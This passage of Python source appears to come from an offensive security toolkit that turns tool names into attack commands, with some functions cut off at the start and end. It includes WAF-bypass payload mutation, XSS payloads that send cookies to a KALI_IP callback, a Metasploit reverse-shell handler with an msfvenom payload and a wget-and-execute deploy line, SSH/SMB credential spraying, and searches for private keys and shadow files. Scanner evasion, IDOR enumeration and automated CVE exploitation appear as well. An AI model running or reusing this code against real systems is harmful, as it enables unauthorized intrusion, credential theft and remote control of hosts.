        templates = args.get("templates", "cves,misconfig,exposure")
        severity  = args.get("severity", "critical,high,medium")
        flags     = args.get("flags", "")
        return f"nuclei -u {shlex.quote(args['target'])} -tags {shlex.quote(templates)} -severity {shlex.quote(severity)} {flags} -no-color 2>&1 | head -120"

    elif tool == "ghauri":
        flags = args.get("flags", "--batch --dbs")
        return f"ghauri -u {shlex.quote(args['url'])} {flags} 2>&1 | head -100"

    elif tool == "payload_mutate":
        target  = shlex.quote(args['target'])
        payload = args['payload']
        ptype   = args.get("type", "generic")
        return f"""python3 - << 'PYEOF'
import subprocess, urllib.parse, sys
target  = {repr(args['target'])}
payload = {repr(payload)}
ptype   = {repr(ptype)}

def test(url, p):
    import subprocess
    r = subprocess.run(['curl','-si','--max-time','6','-A',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        url.replace('FUZZ', urllib.parse.quote(p, safe=''))],
        capture_output=True, text=True)
    code = ''
    for line in r.stdout.splitlines():
        if line.startswith('HTTP/'): code = line.split()[1] if len(line.split())>1 else '?'
    blocked = any(x in r.stdout.lower() for x in ['blocked','forbidden','waf','firewall','406','invalid'])
    return code, blocked, len(r.stdout)

p = payload
variants = [
    p,
    p.replace(' ','/**/'), p.replace(' ','%09'), p.replace(' ','+'),
    p.upper(), p.lower(),
    ''.join(c.upper() if i%2==0 else c for i,c in enumerate(p)),
    p.replace("'", "%27").replace(' ','%20'),
    p.replace("'", "\\\\x27").replace(' ','\\\\x20'),
    p.replace("'", "0x27"),
    p.replace("select","sel/**/ect").replace("union","uni/**/on"),
    p.replace("select","SELECT").replace("union","UNION"),
    p.replace("select","SeLeCt").replace("union","UnIoN"),
    p.replace("or","||").replace("and","&&"),
    p.replace("<script>","<ScRiPt>").replace("</script>","</ScRiPt>"),
    p.replace("<script>","<svg/onload=").replace("</script>",">"),
    p.replace("<script>","<img src=x onerror=").replace("</script>",">"),
    p.replace("../","..%2f"), p.replace("../","..%252f"),
    p.replace("../",".././"), p.replace("/etc/","/etc//"),
    urllib.parse.quote(p), urllib.parse.quote(urllib.parse.quote(p)),
    p + "-- -", p + "#", p + "/*",
    p.replace("=","LIKE"), p.replace("=","<>0 OR id="),
]
print(f"=== PAYLOAD MUTATION: {{len(variants)}} variants ===")
for i,v in enumerate(variants):
    url = target if 'FUZZ' in target else target + urllib.parse.quote(v, safe='')
    try:
        code,blocked,size = test(target, v)
        status = "BLOCKED" if blocked else f"HTTP {{code}} size={{size}}"
        flag = " <<< BYPASS!" if not blocked and code not in ('404','000','') else ''
        print(f"  [{{i+1:02d}}] {{status}}{{flag}}\\n       {{v[:80]}}")
    except Exception as e:
        print(f"  [{{i+1:02d}}] ERROR: {{e}}")
PYEOF"""

    elif tool == "crawl_auth":
        target    = args['target'].rstrip('/')
        username  = shlex.quote(args['username'])
        password  = shlex.quote(args['password'])
        login_url = shlex.quote(args.get('login_url', target + '/login'))
        depth     = int(args.get('depth', 3))
        return f"""
echo "=== AUTH CRAWL: {target} ===" &&
COOKIE_JAR=/tmp/kgb_cookies_$(date +%s).txt &&
echo "--- Login attempt ---" &&
LOGIN_RESP=$(curl -si -c "$COOKIE_JAR" -b "$COOKIE_JAR" -X POST {login_url} \
  -d "username={username}&password={password}&email={username}&user={username}&pass={password}" \
  -L --max-time 15 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)") &&
echo "$LOGIN_RESP" | head -5 &&
SESSION=$(cat "$COOKIE_JAR" 2>/dev/null | grep -v '^#' | awk '{{print $6"="$7}}' | tr '\\n' ';') &&
echo "Session cookies: $SESSION" &&
echo "--- Crawling authenticated pages ---" &&
for PATH_TRY in / /dashboard /admin /profile /account /settings /api /api/v1 /api/v2 /user /users /orders /cart /panel /manage /config /data /export; do
  CODE=$(curl -s -o /tmp/kgb_page.html -w '%{{http_code}}' -b "$COOKIE_JAR" \
    --max-time 8 -A "Mozilla/5.0" "{target}$PATH_TRY" 2>/dev/null)
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && [ "$CODE" != "302" ] && \
    echo "FOUND [$CODE] {target}$PATH_TRY" && \
    grep -oE '(href|src|action)="[^"]*"' /tmp/kgb_page.html 2>/dev/null | grep -vE '(css|js|png|jpg|svg)' | head -10
done &&
echo "--- API endpoint discovery ---" &&
for API in /api/users /api/user/1 /api/orders /api/products /api/admin /api/config /api/keys /api/tokens /v1/users /v2/users; do
  CODE=$(curl -s -o /tmp/kgb_api.txt -w '%{{http_code}}' -b "$COOKIE_JAR" \
    -H "Accept: application/json" --max-time 6 "{target}$API")
  [ "$CODE" = "200" ] && echo "API_FOUND [$CODE] {target}$API" && head -3 /tmp/kgb_api.txt
done 2>&1 | head -80"""

    elif tool == "idor_test":
        target = args['target']
        rng    = args.get('range', '1-50')
        cookie = args.get('cookie', '')
        method = args.get('method', 'GET').upper()
        start, end = (rng.split('-') + ['50'])[:2]
        cookie_flag = f"-H 'Cookie: {cookie}'" if cookie else ""
        base_url    = target.rstrip('0123456789')
        return f"""echo "=== IDOR TEST: {target} (IDs {rng}) ===" &&
BASELINE=$(curl -si {cookie_flag} --max-time 8 -A "Mozilla/5.0" {shlex.quote(target)} 2>/dev/null | wc -c) &&
echo "Baseline size: $BASELINE bytes" &&
for ID in $(seq {start} {end}); do
  URL=$(echo {shlex.quote(target)} | sed "s/[0-9][0-9]*/$ID/g")
  RESP=$(curl -si {cookie_flag} --max-time 6 -A "Mozilla/5.0" "$URL" 2>/dev/null)
  CODE=$(echo "$RESP" | head -1 | awk '{{print $2}}')
  SIZE=$(echo "$RESP" | wc -c)
  DIFF=$((SIZE - BASELINE))
  [ "$CODE" = "200" ] && [ "$DIFF" -gt 50 ] && echo "IDOR_HIT [$CODE] ID=$ID size=$SIZE diff=$DIFF URL=$URL"
  [ "$CODE" = "200" ] && [ "$DIFF" -lt -50 ] && echo "IDOR_DIFFERENT [$CODE] ID=$ID size=$SIZE URL=$URL"
done 2>&1 | head -60"""

    elif tool == "second_order":
        target       = args['target'].rstrip('/')
        inject_path  = args.get('inject_path', '/register')
        trigger_path = args.get('trigger_path', '/profile')
        field        = args.get('field', 'username')
        cookie       = args.get('cookie', '')
        cookie_flag  = f"-H 'Cookie: {cookie}'" if cookie else ""
        payloads = [
            "<script>fetch('http://KALI_IP:3000/cb?c='+document.cookie)</script>",
            "'\"><img src=x onerror=fetch('http://KALI_IP:3000/cb?x='+document.cookie)>",
            "admin'--",
            "' UNION SELECT 1,2,user(),4--",
            "{{7*7}}",
            "${7*7}",
        ]
        return f"""echo "=== SECOND-ORDER INJECTION: {target} ===" &&
COOKIE_JAR=/tmp/kgb_so_$(date +%s).txt &&
{f'echo "Using provided session cookie"' if cookie else 'echo "No auth provided"'} &&
for PAYLOAD in {' '.join(shlex.quote(p) for p in payloads)}; do
  echo "--- Injecting: ${{PAYLOAD:0:60}} ---" &&
  RAND="kgbtest$(date +%s%N | tail -c 6)" &&
  curl -si -c "$COOKIE_JAR" -b "$COOKIE_JAR" {cookie_flag} \
    -X POST {shlex.quote(target + inject_path)} \
    -d "{field}=$RAND$PAYLOAD&email=$RAND@test.com&password=Test1234!" \
    --max-time 10 -A "Mozilla/5.0" -L 2>/dev/null | head -3 &&
  sleep 1 &&
  TRIGGER_RESP=$(curl -si -b "$COOKIE_JAR" {cookie_flag} \
    --max-time 10 -A "Mozilla/5.0" {shlex.quote(target + trigger_path)} 2>/dev/null) &&
  echo "$TRIGGER_RESP" | grep -i "script\\|onerror\\|alert\\|__OK__\\|49\\b\\|$RAND" | head -5 &&
  echo "$TRIGGER_RESP" | grep -c "200\\|OK" | grep -q "1" && echo "[STATUS] 200 OK"
done 2>&1 | head -80"""

    elif tool == "bizlogic_fuzz":
        target   = args['target'].rstrip('/')
        endpoint = args.get('endpoint', '/cart/add')
        cookie   = args.get('cookie', '')
        mode     = args.get('mode', 'all')
        cookie_flag = f"-H 'Cookie: {cookie}'" if cookie else ""
        return f"""echo "=== BUSINESS LOGIC FUZZ: {target}{endpoint} ===" &&
BASE_URL={shlex.quote(target + endpoint)} &&
{'echo "--- NEGATIVE PRICE TEST ---" && for PRICE in -1 -100 -9999 0.001 0.00 999999999; do CODE=$(curl -s -o /tmp/kgb_bl.txt -w '"'"'%{{http_code}}'"'"' {cookie_flag} -X POST "$BASE_URL" -d "price=$PRICE&amount=$PRICE&quantity=1" --max-time 8); echo "price=$PRICE -> HTTP $CODE: $(head -1 /tmp/kgb_bl.txt | head -c 80)"; done' if mode in ('price','all') else 'echo "Skipping price tests"'} &&
{'echo "--- QUANTITY OVERFLOW TEST ---" && for QTY in -1 0 2147483647 9999999 -2147483648 99999999999; do CODE=$(curl -s -o /tmp/kgb_bl.txt -w '"'"'%{{http_code}}'"'"' {cookie_flag} -X POST "$BASE_URL" -d "quantity=$QTY&qty=$QTY&amount=$QTY" --max-time 8); echo "qty=$QTY -> HTTP $CODE: $(head -1 /tmp/kgb_bl.txt | head -c 80)"; done' if mode in ('qty','all') else 'echo "Skipping qty tests"'} &&
{'echo "--- COUPON REUSE TEST ---" && for COUPON in SAVE100 DISCOUNT FREE100 ADMIN TEST AAAA 1234; do CODE=$(curl -s -o /tmp/kgb_bl.txt -w '"'"'%{{http_code}}'"'"' {cookie_flag} -X POST {shlex.quote(target)}/apply-coupon -d "coupon=$COUPON&code=$COUPON" --max-time 8); echo "coupon=$COUPON -> HTTP $CODE"; done && echo "Race condition test:" && for i in $(seq 1 10); do curl -s {cookie_flag} -X POST "$BASE_URL" -d "coupon=SAVE50" --max-time 5 -o /dev/null -w "%{{http_code}} " & done; wait; echo' if mode in ('coupon','race','all') else 'echo "Skipping coupon tests"'} 2>&1 | head -80"""

    elif tool == "evasion_scan":
        target = args['target']
        mode   = args.get('mode', 'full')
        proxy  = args.get('proxy', '')
        proxy_cmd = f"proxychains4 -q" if proxy else ""
        tgt_ip = target.replace('https://','').replace('http://','').split('/')[0]
        return f"""echo "=== EVASION SCAN: {target} ===" &&
{'echo "--- STEALTH NMAP (T1, decoys, frag) ---" && ' + proxy_cmd + f' nmap -sS -T1 -f --data-length 24 -D RND:10 --randomize-hosts --source-port 53 -Pn -sV --version-intensity 1 {shlex.quote(tgt_ip)} 2>&1 | head -40' if mode in ('stealth','full') else 'echo "Skipping stealth nmap"'} &&
{'echo "--- SLOW NUCLEI (rate-limited, random UA) ---" && ' + proxy_cmd + f' nuclei -u {shlex.quote(target)} -tags cves,misconfig,exposure -rl 3 -timeout 10 -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -no-color 2>&1 | head -50' if mode in ('slow','full') else 'echo "Skipping slow nuclei"'} &&
echo "--- TIMING RANDOMIZED REQUESTS ---" &&
for PATH_TRY in /admin /config /.env /.git/config /backup /phpinfo.php; do
  sleep $(python3 -c "import random; print(round(random.uniform(1,4),1))")
  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 8 \
    -H "X-Forwarded-For: $(python3 -c 'import random; print(\".\".join(str(random.randint(1,254)) for _ in range(4)))')" \
    -A "Mozilla/$(python3 -c 'import random; print(round(random.uniform(4,6),1))') (Windows NT 10.0)" \
    {shlex.quote(target.rstrip('/'))}$PATH_TRY)
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[$CODE] $PATH_TRY"
done 2>&1 | head -60"""

    elif tool == "c2_handler":
        payload = shlex.quote(args.get('payload', 'linux/x86/shell/reverse_tcp'))
        lhost   = args.get('lhost', '$(hostname -I | awk \'{print $1}\')')
        lport   = args.get('lport', '4444')
        msf_cmds = f"use exploit/multi/handler; set PAYLOAD {args.get('payload','linux/x86/shell/reverse_tcp')}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j; exit"
        return f"""echo "=== C2 HANDLER SETUP ===" &&
echo "Payload : {args.get('payload','linux/x86/shell/reverse_tcp')}" &&
echo "LHOST   : {lhost}" &&
echo "LPORT   : {lport}" &&
echo "Starting MSF handler in background..." &&
nohup msfconsole -q -x {shlex.quote(msf_cmds)} > /tmp/kgb_c2.log 2>&1 & disown &&
sleep 3 &&
echo "Handler PID: $!" &&
echo "Log: /tmp/kgb_c2.log" &&
tail -20 /tmp/kgb_c2.log &&
echo "=== Generating matching payload ===" &&
msfvenom -p {args.get('payload','linux/x86/shell/reverse_tcp')} \
  LHOST={lhost} LPORT={lport} \
  -f elf -o /tmp/kgb_shell.elf 2>&1 &&
echo "Payload saved: /tmp/kgb_shell.elf" &&
echo "Deploy: wget http://{lhost}:{lport}/kgb_shell.elf -O /tmp/s && chmod +x /tmp/s && /tmp/s &"
"""

    elif tool == "lateral_move":
        pivot  = shlex.quote(args['pivot_host'])
        net    = shlex.quote(args.get('network', ''))
        creds  = args.get('creds', '')
        mode   = args.get('mode', 'full')
        user, pw = (creds.split(':',1) + [''])[:2] if ':' in creds else ('', creds)
        return f"""echo "=== LATERAL MOVEMENT from {args['pivot_host']} ===" &&
{'echo "--- Internal network discovery ---" && nmap -sn --min-rate 5000 ' + shlex.quote(args.get('network','192.168.1.0/24')) + ' 2>&1 | grep "Nmap scan\\|report\\|up" | head -30' if mode in ('enum','full') else 'echo "Skipping enum"'} &&
{'echo "--- Credential reuse via SSH ---" && for HOST in $(nmap -sn --min-rate 3000 ' + shlex.quote(args.get('network','192.168.1.0/24')) + ' 2>/dev/null | grep "report for" | awk \'{print $5}\'); do CODE=$(sshpass -p ' + shlex.quote(pw) + ' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 ' + shlex.quote(user) + '@$HOST "id; hostname; cat /etc/passwd | head -5" 2>/dev/null); [ -n "$CODE" ] && echo "SSH_OK $HOST: $CODE"; done' if mode in ('spread','full') and user and pw else 'echo "No creds for SSH spread"'} &&
{'echo "--- SMB credential test ---" && crackmapexec smb ' + shlex.quote(args.get('network','192.168.1.0/24')) + ' -u ' + shlex.quote(user) + ' -p ' + shlex.quote(pw) + ' 2>&1 | grep -E "\\+|Pwn3d" | head -20' if mode in ('spread','full') and user else 'echo "No creds for SMB spread"'} &&
echo "--- Local privilege escalation check ---" &&
echo "SUID binaries:" && find / -perm -4000 -type f 2>/dev/null | head -15 &&
echo "Writable /etc:" && ls -la /etc/passwd /etc/shadow /etc/cron* 2>/dev/null &&
echo "Sudo rules:" && sudo -l 2>/dev/null | head -10 &&
echo "Interesting files:" && find /home /root /var/www /opt -name "*.conf" -o -name "*.env" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null | head -20 2>&1 | head -80"""

    elif tool == "playwright_crawl":
        target    = shlex.quote(args['target'])
        login_url = shlex.quote(args.get('login_url', args['target'].rstrip('/') + '/login'))
        username  = shlex.quote(args.get('username', ''))
        password  = shlex.quote(args.get('password', ''))
        depth     = int(args.get('depth', 2))
        script = f"""python3 - <<'PYEOF'
import asyncio, json, sys
try:
    from playwright.async_api import async_playwright
except ImportError:
    print("INSTALL: pip3 install playwright && playwright install chromium")
    sys.exit(0)

async def run():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
        ctx  = await browser.new_context(ignore_https_errors=True)
        page = await ctx.new_page()
        found_urls = set()
        api_calls  = []

        page.on("request",  lambda r: api_calls.append(f"REQ  {{r.method}} {{r.url}}")  if 'api' in r.url or r.method != 'GET' else None)
        page.on("response", lambda r: api_calls.append(f"RESP {{r.status}} {{r.url}}") if r.status >= 400 else None)

        # Login
        if {username} and {password}:
            print(f"[+] Logging in to {args.get('login_url', args['target'].rstrip('/')+'/login')}")
            await page.goto({login_url}, timeout=15000)
            await page.wait_for_load_state('networkidle', timeout=10000)
            for sel in ['input[name=username]','input[name=user]','input[name=email]','input[type=email]']:
                try: await page.fill(sel, {username}); break
                except: pass
            for sel in ['input[name=password]','input[name=pass]','input[type=password]']:
                try: await page.fill(sel, {password}); break
                except: pass
            for sel in ['button[type=submit]','input[type=submit]','button:has-text("Login")','button:has-text("Sign")']:
                try: await page.click(sel); break
                except: pass
            await page.wait_for_load_state('networkidle', timeout=8000)
            print(f"[+] Post-login URL: {{page.url}}")

        # Crawl
        await page.goto({target}, timeout=15000)
        await page.wait_for_load_state('networkidle', timeout=8000)
        found_urls.add(page.url)

        for _ in range({depth}):
            links = await page.eval_on_selector_all('a[href]', 'els => els.map(e => e.href)')
            new_links = [l for l in links if {args['target']!r} in l and l not in found_urls][:15]
            for url in new_links:
                try:
                    await page.goto(url, timeout=8000)
                    await page.wait_for_load_state('domcontentloaded', timeout=5000)
                    found_urls.add(url)
                    forms = await page.eval_on_selector_all('form', 'fs => fs.map(f => ({{action:f.action,method:f.method,inputs:[...f.querySelectorAll("input,select,textarea")].map(i=>i.name)}}))')
                    if forms: print(f"FORMS at {{url}}: {{json.dumps(forms)}}")
                except: pass

        print("\\n=== DISCOVERED URLS ===")
        for u in sorted(found_urls): print(u)
        print("\\n=== API/XHR CALLS ===")
        for a in api_calls[:60]: print(a)
        await browser.close()

asyncio.run(run())
PYEOF"""
        return script

    elif tool == "adaptive_mutate":
        target  = args['target']
        payload = args['payload']
        ptype   = args.get('type', 'sqli')
        rounds  = int(args.get('rounds', 5))
        script = f"""python3 - <<'PYEOF'
import subprocess, urllib.parse, json, time

TARGET  = {shlex.quote(target)}
PAYLOAD = {shlex.quote(payload)}
PTYPE   = {shlex.quote(ptype)}
ROUNDS  = {rounds}

def probe(url):
    r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{{http_code}}|%{{size_download}}',
                        '-A','Mozilla/5.0','-m','10', url], capture_output=True, text=True)
    return r.stdout.strip()

def mutate(p, mode):
    enc = urllib.parse.quote(p)
    dbl = urllib.parse.quote(enc)
    variants = {{
        'space2comment': p.replace(' ', '/**/'),
        'case_mix':      ''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p)),
        'url_encode':    enc,
        'double_encode': dbl,
        'hex_encode':    ''.join(f'%{{ord(c):02x}}' for c in p),
        'unicode':       p.replace("'", "%u0027").replace('"', "%u0022"),
        'null_byte':     p + '%00',
        'comment_split': p[:len(p)//2] + '/**/' + p[len(p)//2:],
    }}
    if PTYPE == 'sqli':
        variants['equaltolike'] = p.replace('=', ' LIKE ')
        variants['charencode']  = ','.join(f'CHAR({{ord(c)}})' for c in p[:20])
        variants['between']     = p.replace('=1','BETWEEN 0 AND 2')
        variants['time_based']  = p.replace('1=1','1=1 AND SLEEP(3)')
    elif PTYPE == 'xss':
        variants['tag_break']   = p.replace('<script>','<ScRiPt>').replace('</script>','</ScRiPt>')
        variants['svg_xss']     = '<svg/onload=' + p.replace('<script>alert(','alert(').replace('</script>','') + '>'
        variants['img_xss']     = '<img src=x onerror=' + p.replace('<script>','').replace('</script>','') + '>'
    return variants

base_url = TARGET.replace('INJECT', urllib.parse.quote(PAYLOAD))
print(f"[+] BASE probe: {{base_url}}")
base_resp = probe(base_url)
code, size = base_resp.split('|') if '|' in base_resp else (base_resp,'?')
print(f"    Response: HTTP {{code}}  Size: {{size}}")

blocked = code in ('403','406','419','429','503') or size == '0'
print(f"    Blocked: {{blocked}}")

variants = mutate(PAYLOAD, PTYPE)
print(f"\\n[+] Testing {{len(variants)}} adaptive variants ({{ROUNDS}} rounds)...")

hits = []
for i, (name, variant) in enumerate(variants.items()):
    if i >= ROUNDS * 2: break
    url = TARGET.replace('INJECT', urllib.parse.quote(variant))
    resp = probe(url)
    rc, sz = resp.split('|') if '|' in resp else (resp,'?')
    status = "PASS" if rc not in ('403','406','419','429','503') and sz != '0' else "BLOCK"
    if status == "PASS": hits.append((name, variant, rc, sz))
    print(f"  [{{status}}] {{name:<20}} HTTP {{rc}}  Size {{sz}}")
    time.sleep(0.3)

print(f"\\n=== RESULTS: {{len(hits)}} bypasses found ===")
for name, v, rc, sz in hits:
    print(f"  [BYPASS] {{name}}: {{v[:80]}}")
    print(f"           HTTP {{rc}}  Size {{sz}}")
PYEOF"""
        return script

    elif tool == "cve_rag":
        product  = shlex.quote(args['product'])
        version  = shlex.quote(args['version'])
        severity = args.get('severity', 'high').upper()
        limit    = min(int(args.get('limit', 10)), 20)
        MSF_MAP  = {
            'log4j': 'exploit/multi/http/log4shell_header_injection',
            'apache_2.4.49': 'exploit/multi/http/apache_normalize_path_rce',
            'ms17-010': 'exploit/windows/smb/ms17_010_eternalblue',
            'bluekeep': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'heartbleed': 'auxiliary/scanner/ssl/openssl_heartbleed',
            'shellshock': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            'struts': 'exploit/multi/http/struts2_content_type_ognl',
            'drupal': 'exploit/unix/webapp/drupal_drupalgeddon2',
            'wordpress': 'exploit/unix/webapp/wp_admin_shell_upload',
            'tomcat': 'exploit/multi/http/tomcat_jsp_upload_bypass',
        }
        return f"""python3 - <<'PYEOF'
import urllib.request, json, urllib.parse

PRODUCT  = {product}
VERSION  = {version}
SEVERITY = {shlex.quote(severity)}
LIMIT    = {limit}

MSF_MAP = {json.dumps(MSF_MAP)}

keyword = f"{{PRODUCT}} {{VERSION}}"
url = "https://services.nvd.nist.gov/rest/json/cves/2.0?" + urllib.parse.urlencode({{
    "keywordSearch": keyword, "resultsPerPage": LIMIT, "cvssV3Severity": SEVERITY
}})

print(f"=== CVE RAG: {{PRODUCT}} {{VERSION}} (severity >= {{SEVERITY}}) ===")
try:
    req = urllib.request.Request(url, headers={{"User-Agent": "kgbtools-rag/1.0"}})
    with urllib.request.urlopen(req, timeout=15) as r:
        data = json.loads(r.read())
    vulns = data.get("vulnerabilities", [])
    print(f"Found {{len(vulns)}} CVEs (total: {{data.get('totalResults',0)}})")
    for v in vulns:
        cve   = v["cve"]
        cid   = cve["id"]
        desc  = (cve.get("descriptions") or [{{}}])[0].get("value","")[:150]
        score = "N/A"
        for key in ("cvssMetricV31","cvssMetricV30","cvssMetricV2"):
            if key in cve.get("metrics",{{}}):
                d     = cve["metrics"][key][0]["cvssData"]
                sev   = cve["metrics"][key][0].get("baseSeverity","")
                vec   = d.get("vectorString","")
                score = f"{{d.get('baseScore','?')}} {{sev}}  [{{vec}}]"
                break
        refs  = [r["url"] for r in cve.get("references",[])[:3] if "github" in r["url"] or "exploit" in r["url"] or "poc" in r["url"].lower()]
        msf   = next((v for k,v in MSF_MAP.items() if k in cid.lower() or k in PRODUCT.lower()), None)
        print(f"\\n  [{{cid}}] CVSS: {{score}}")
        print(f"  {{desc}}")
        if refs: print(f"  PoC/Refs: {{', '.join(refs)}}")
        if msf:  print(f"  MSF module: {{msf}}")
except Exception as e:
    print(f"[NVD error: {{e}}]")
PYEOF"""

    elif tool == "session_manage":
        action     = args.get('action', 'login')
        target     = shlex.quote(args['target'])
        sess_id    = args.get('session_id', 'kgb_session')
        cookie_jar = f"/tmp/{sess_id}_cookies.txt"
        if action == "login":
            user = shlex.quote(args.get('username', ''))
            pw   = shlex.quote(args.get('password', ''))
            data = shlex.quote(args.get('data', f"username={args.get('username','')}&password={args.get('password','')}"))
            return f"""echo "=== SESSION LOGIN ===" &&
curl -s -c {shlex.quote(cookie_jar)} -b {shlex.quote(cookie_jar)} \\
  -X POST {target} \\
  -d {data} \\
  -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \\
  -L --max-redirs 5 -w "\\nHTTP: %{{http_code}}" 2>&1 | head -60 &&
echo "\\n=== SAVED COOKIES ===" &&
cat {shlex.quote(cookie_jar)} 2>/dev/null | grep -v '^#' | head -20"""
        elif action == "get":
            extra = shlex.quote(args.get('data', ''))
            return f"""echo "=== SESSION GET (using saved cookies) ===" &&
curl -s -c {shlex.quote(cookie_jar)} -b {shlex.quote(cookie_jar)} \\
  {target} \\
  -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \\
  -L --max-redirs 3 -w "\\nHTTP: %{{http_code}}" 2>&1 | head -80"""
        elif action == "csrf":
            return f"""echo "=== CSRF TOKEN EXTRACTION ===" &&
curl -s -c {shlex.quote(cookie_jar)} -b {shlex.quote(cookie_jar)} {target} | \\
  grep -oiE '(csrf|_token|authenticity_token|nonce)[^"]*"[^"]*"|value="[a-zA-Z0-9_/+=]{{20,}}"' | head -10"""
        elif action == "jwt_decode":
            jwt = shlex.quote(args.get('cookie', ''))
            return f"""python3 - <<'PYEOF'
import base64, json
token = {jwt}
parts = token.split('.')
for i, part in enumerate(['Header','Payload']):
    try:
        pad = part + '=' * (-len(parts[i]) % 4)
        decoded = json.loads(base64.urlsafe_b64decode(pad))
        print(f"[{{part}}] {{json.dumps(decoded, indent=2)}}")
        if i == 1:
            import time
            exp = decoded.get('exp')
            if exp: print(f"  Expires: {{time.strftime('%Y-%m-%d %H:%M', time.gmtime(exp))}} ({'EXPIRED' if time.time() > exp else 'VALID'})")
    except Exception as e:
        print(f"[{{part}}] decode error: {{e}}")
PYEOF"""
        else:
            return f"echo 'session_manage: unknown action {action}'"

    elif tool == "mitmproxy_scan":
        port      = int(args.get('port', 8080))
        mode      = args.get('mode', 'intercept')
        target    = shlex.quote(args['target'])
        duration  = int(args.get('duration', 30))
        flows_f   = shlex.quote(args.get('flows_file', '/tmp/kgb_flows.mitm'))

        if mode == "intercept":
            return f"""echo "=== MITMPROXY INTERCEPT (port {port}, {duration}s) ===" &&
mkdir -p /tmp/kgb_mitm &&
python3 - <<'PYEOF' &
from mitmproxy.tools.main import mitmdump
import sys, os
sys.argv = ['mitmdump', '-p', '{port}', '-w', '/tmp/kgb_flows.mitm', '--quiet']
mitmdump()
PYEOF
PROXY_PID=$!
echo "Proxy PID: $PROXY_PID  Port: {port}" &&
sleep 2 &&
echo "Sending target through proxy..." &&
curl -s --proxy http://127.0.0.1:{port} --insecure {target} -A 'Mozilla/5.0' -L -w "\\nHTTP: %{{http_code}}" 2>&1 | head -40 &&
sleep 2 &&
kill $PROXY_PID 2>/dev/null &&
echo "\\n=== CAPTURED ===" &&
python3 -c "
from mitmproxy import io as mio
with open('/tmp/kgb_flows.mitm','rb') as f:
    for flow in mio.FlowReader(f).stream():
        print(f'  {{flow.request.method}} {{flow.request.pretty_url}} -> {{flow.response.status_code if flow.response else \"?\"}}')" 2>&1 | head -50"""
        elif mode == "analyze":
            return f"""python3 - <<'PYEOF'
from mitmproxy import io as mio
import re, json
SECRETS_RE = re.compile(r'(password|passwd|token|secret|api[_-]?key|auth|session|jwt|bearer)["\s:=]+([^\s"&{{}}]+)', re.I)
try:
    with open({flows_f}, 'rb') as f:
        for flow in mio.FlowReader(f).stream():
            req = flow.request
            body = req.get_text() or ''
            print(f"{{req.method}} {{req.pretty_url}}")
            if req.headers: print(f"  Headers: {{dict(req.headers)}}")
            if body: print(f"  Body: {{body[:200]}}")
            for m in SECRETS_RE.finditer(body + str(dict(req.headers))):
                print(f"  [SECRET] {{m.group(0)[:100]}}")
            if flow.response:
                rbody = flow.response.get_text() or ''
                for m in SECRETS_RE.finditer(rbody[:2000]):
                    print(f"  [RESP SECRET] {{m.group(0)[:100]}}")
except Exception as e:
    print(f"[error] {{e}}")
PYEOF"""
        elif mode == "fuzz":
            return f"""python3 - <<'PYEOF'
import subprocess, itertools
TARGET = {target}
FUZZ_HEADERS = [
    {{'X-Forwarded-For': '127.0.0.1'}},
    {{'X-Real-IP': '127.0.0.1'}},
    {{'X-Originating-IP': '127.0.0.1'}},
    {{'X-Custom-IP-Authorization': '127.0.0.1'}},
    {{'X-Forwarded-Host': 'localhost'}},
    {{'X-Original-URL': '/admin'}},
    {{'X-Rewrite-URL': '/admin'}},
]
print("=== HEADER INJECTION FUZZ ===")
for hdrs in FUZZ_HEADERS:
    hdr_args = []
    for k,v in hdrs.items(): hdr_args += ['-H', f'{{k}}: {{v}}']
    r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{{http_code}}|%{{size_download}}',
        '-m','8','--insecure',TARGET]+hdr_args, capture_output=True, text=True)
    code,sz = r.stdout.strip().split('|') if '|' in r.stdout else (r.stdout,'?')
    flag = " *** INTERESTING ***" if code in ('200','301','302') else ""
    print(f"  {{list(hdrs.keys())[0]}: {{list(hdrs.values())[0]:<20}} HTTP {{code}}  Size {{sz}}{{flag}}")
PYEOF"""
        else:
            return f"echo 'mitmproxy_scan: unknown mode {mode}'"

    elif tool == "waf_bypass":
        target = shlex.quote(args['target'])
        mode   = args.get("mode", "full")
        cmds   = [f"echo '=== WAF DETECTION ===' && wafw00f {target} 2>&1 | tail -20"]
        if mode in ("sqli", "full"):
            cmds.append(
                f"echo '=== SQLi BYPASS ===' && sqlmap -u {target} "
                f"--tamper=space2comment,charencode,randomcase,between,equaltolike "
                f"--random-agent --level=3 --risk=2 --batch --timeout=15 "
                f"--retries=2 2>&1 | tail -40"
            )
        if mode in ("fuzz", "full"):
            cmds.append(
                f"echo '=== DIR FUZZ BYPASS ===' && ffuf -u {target.strip(chr(39))}/FUZZ "
                f"-w /usr/share/seclists/Discovery/Web-Content/common.txt "
                f"-H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)' "
                f"-H 'X-Forwarded-For: 127.0.0.1' -mc 200,201,301,302,403 -fc 404 "
                f"-t 20 -timeout 10 2>&1 | head -50"
            )
        return " && ".join(cmds)

    elif tool == "msf_exploit":
        target = shlex.quote(args['target'])
        cve    = args.get("cve", "").replace("CVE-", "cve:").lower()
        lhost  = args.get("lhost", "$(hostname -I | awk '{print $1}')")
        lport  = args.get("lport", "4444")
        msf_cmds = (
            f"search {cve}; "
            f"use 0; "
            f"set RHOSTS {args['target']}; "
            f"set LHOST {lhost}; "
            f"set LPORT {lport}; "
            f"set VERBOSE false; "
            f"run; exit"
        )
        return f"msfconsole -q -x {shlex.quote(msf_cmds)} 2>&1 | head -100"

    elif tool == "httpx":
        flags = args.get("flags", "-title -tech-detect -status-code -ip -silent")
